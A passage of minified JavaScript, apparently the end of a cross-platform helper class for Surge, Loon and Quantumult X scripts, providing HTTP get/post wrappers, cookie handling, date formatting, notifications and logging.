t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}